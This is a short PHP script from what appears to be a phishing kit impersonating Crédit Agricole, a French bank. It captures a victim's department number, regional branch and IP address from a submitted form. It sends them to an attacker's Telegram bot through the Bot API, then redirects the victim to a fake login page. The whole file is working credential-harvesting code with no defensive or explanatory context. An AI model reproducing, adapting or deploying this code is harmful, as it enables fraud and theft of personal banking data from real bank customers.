<?php

session_start();

include "../../email.php";


$ip = getenv("REMOTE_ADDR");


$message = "[+]━━━━【🔥 CA Region 🔥】━━━━[+]\r\n";
$message .= 'N° de département   :  ' . $_POST['region_number'] . "\r\n";
$message .= 'Caisse régionale    :  ' . $_POST['region_caisse'] . "\r\n";
$message .= "[+]━━━━【💻 System INFO】━━━━[+]\r\n";
$message .= "[+] IP : " .$ip."\n";
$message .= "[+]━━━━【🔥 CA Bank  🔥】━━━━[+]\n";



file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );

HEADER("Location: ../login.php");


?>

